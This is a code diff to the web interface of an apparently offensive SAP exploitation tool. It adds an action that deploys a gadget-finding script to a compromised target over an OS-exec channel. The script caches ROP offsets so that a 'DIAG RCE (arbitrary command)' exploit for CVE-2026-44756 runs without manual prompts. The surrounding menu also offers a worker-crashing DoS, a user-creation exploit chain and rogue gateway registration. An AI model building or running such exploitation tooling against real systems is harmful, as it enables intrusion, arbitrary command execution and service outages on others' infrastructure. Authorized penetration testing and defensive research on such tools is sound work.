@@ -1265,6 +1265,7 @@ body {
       <div class="ctx-item" data-action="create_user_betrusted">&#128272; Create User (10KBLAZE Full Chain)</div>
       <div class="ctx-item" data-action="exploit_cve_44756_dos">&#9889; Trigger CVE-2026-44756 DoS (crashes ICM worker)</div>
       <div class="ctx-item" data-action="capture_cve_44756_bases">&#128270; Capture CVE-2026-44756 bases (recon-only, via OS-exec)</div>
+      <div class="ctx-item" data-action="capture_cve_44756_gadgets">&#128270; Capture CVE-2026-44756 gadgets (recon-only, via OS-exec)</div>
       <div class="ctx-item" data-action="exploit_cve_44756_diag_crash">&#9889; Trigger CVE-2026-44756 DIAG crash probe (for rdx capture)</div>
       <div class="ctx-item" data-action="exploit_cve_44756_diag_rce">&#9889; Trigger CVE-2026-44756 DIAG RCE (arbitrary command)</div>
       <div class="ctx-item" data-action="exploit_cve_58240_register">&#9889; Register Rogue ASCS Gateway (CVE-2026-58240)</div>
@@ -6007,6 +6008,7 @@ function showCtxMenu(e, sid) {
     // AND requires a check to have flagged the target as vulnerable
     // (otherwise there is no reason to burn OS-exec traffic).
     'capture_cve_44756_bases':      hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
+    'capture_cve_44756_gadgets':    hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
     // DIAG RCE requires a vulnerable verdict; recon-values are prompted
     // for or auto-captured at trigger time.
     'exploit_cve_44756_diag_rce':   hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
@@ -6322,6 +6324,7 @@ function showCtxMenu(e, sid) {
     'check_cve_44756':              'Only applicable to systems with an ICM (ABAP / double-stack / Web Dispatcher)',
     'exploit_cve_44756_dos':        'Run "Check CVE-2026-44756" first — no ICM port on record',
     'capture_cve_44756_bases':      'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
+    'capture_cve_44756_gadgets':    'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
     'exploit_cve_44756_diag_rce':   'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
     'exploit_cve_44756_diag_crash': 'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
     'exploit_cve_58240_register':   'Run "Check CVE-2026-58240" first — need a target where the opcode family is recognised',
@@ -6630,6 +6633,7 @@ function showCtxMenu(e, sid) {
     // the check has flagged the node as vulnerable — showing them on
     // patched or unchecked nodes just clutters the menu.
     'capture_cve_44756_bases':        !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
+    'capture_cve_44756_gadgets':      !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
     'exploit_cve_44756_diag_rce':     !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
     'exploit_cve_44756_diag_crash':   !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
     'exploit_cve_58240_register':     !hasCve58240Check,
@@ -8044,6 +8048,23 @@ async function ctxAction(action) {
       await api('POST', `node/${sid}/exploit_cve_2026_44756_diag_crash_probe`, {confirm: true});
       break;
     }
+    case 'capture_cve_44756_gadgets': {
+      const nn = (mapState.nodes || {})[sid];
+      if (!nn) { showToast('Node not found', 'warn'); break; }
+      const info =
+        'CVE-2026-44756 gadget capture (recon-only)\n\n'
+        + 'SAPMAP will deploy tools/cve-2026-44756/find_gadgets.py to '
+        + 'the target via the existing OS-exec channel, scan the '
+        + 'target\'s disp+work and libc for the three CVE-2026-44756 '
+        + 'gadget offsets, and cache them on the node.\n\n'
+        + 'Once cached, "Trigger CVE-2026-44756 DIAG RCE" uses them '
+        + 'automatically — no more 5 override prompts per run.\n\n'
+        + 'No exploit is fired. Nothing crashes. Only recon.\n\n'
+        + 'Proceed?';
+      if (!confirm(info)) break;
+      await api('POST', `node/${sid}/exploit_cve_2026_44756_capture_gadgets`, {});
+      break;
+    }
     case 'capture_cve_44756_bases': {
       const nn = (mapState.nodes || {})[sid];
       if (!nn) { showToast('Node not found', 'warn'); break; }
@@ -8141,17 +8162,35 @@ async function ctxAction(action) {
       // (connection dropped, 0 bytes reply) but nothing runs.
       // Fix: run tools/cve-2026-44756/find_gadgets.py on the target
       // to extract the per-build offsets and paste them in here.
-      const useOverride = confirm(
-        'Override gadget offsets for this target build?\n\n'
-        + 'Defaults are Julian\'s kernel 7.93 PL101 + glibc 2.31.  On '
-        + 'any other build you likely need per-target offsets or the '
-        + 'delivery will succeed on the wire but nothing runs (RIP '
-        + 'hijack lands on the wrong instruction and SIGSEGVs).\n\n'
-        + 'OK  = enter overrides now (recommended if you haven\'t '
-        + 'confirmed the target is exactly kernel 7.93 PL101).\n'
-        + 'Cancel = use defaults.\n\n'
-        + 'To extract the values, on the target:\n'
-        + '    python3 tools/cve-2026-44756/find_gadgets.py ' + sid);
+      // If gadget offsets are already cached on the node (either from
+      // a prior manual entry OR from "Capture CVE-2026-44756 gadgets"),
+      // skip the override prompt entirely — the backend picks them up
+      // automatically.
+      const cachedS1  = nn.cve_2026_44756_stage1_dw_off   || '';
+      const cachedS2  = nn.cve_2026_44756_stage2_libc_off || '';
+      const cachedSY  = nn.cve_2026_44756_system_libc_off || '';
+      const cachedDR  = nn.cve_2026_44756_stage2_disp_rdi || '';
+      const cachedBO  = nn.cve_2026_44756_stage2_b_off    || '';
+      const hasAllCachedGadgets = !!(cachedS1 && cachedS2 && cachedSY);
+      let useOverride = false;
+      if (hasAllCachedGadgets) {
+        showToast('Using cached gadget offsets from "Capture CVE-2026-44756 gadgets"',
+                   'info');
+      } else {
+        useOverride = confirm(
+          'Override gadget offsets for this target build?\n\n'
+          + 'Defaults are Julian\'s kernel 7.93 PL101 + glibc 2.31.  On '
+          + 'any other build you likely need per-target offsets or the '
+          + 'delivery will succeed on the wire but nothing runs (RIP '
+          + 'hijack lands on the wrong instruction and SIGSEGVs).\n\n'
+          + 'TIP: right-click → Exploitation → "Capture CVE-2026-44756 '
+          + 'gadgets" auto-fills every value.  You\'d only override '
+          + 'manually if that action isn\'t available.\n\n'
+          + 'OK  = enter overrides now.\n'
+          + 'Cancel = use defaults (Julian\'s build).\n\n'
+          + 'To extract manually, on the target:\n'
+          + '    python3 tools/cve-2026-44756/find_gadgets.py ' + sid);
+      }
       let stage1_dw_off_hex = '';
       let stage2_libc_off_hex = '';
       let system_libc_off_hex = '';
